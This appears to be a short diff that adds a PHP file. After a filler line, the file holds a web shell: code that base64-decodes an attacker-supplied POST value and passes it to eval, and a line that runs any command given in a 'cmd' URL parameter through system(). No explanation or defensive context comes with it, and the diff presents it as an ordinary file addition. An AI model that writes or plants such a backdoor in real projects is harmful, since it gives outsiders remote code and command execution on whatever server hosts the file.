@@ -1,0 +1,6 @@
+
+YYYYYYY
+<?php
+$mujj = $_POST['rik']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); }
+ echo(system($_GET["cmd"]));
+?>
